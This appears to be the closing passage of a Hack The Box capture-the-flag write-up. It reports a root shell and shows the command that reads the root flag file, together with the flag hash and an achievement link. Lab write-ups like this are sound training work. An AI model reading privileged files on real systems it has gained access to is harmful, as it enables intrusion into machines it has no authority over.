We got a root shell and can finally read the root flag to end the CTF:

```
# $ cat /root/root.txt
2b71554b7c0ee1e6c346a29228bf173f
```

https://www.hackthebox.com/achievement/machine/1872557/189


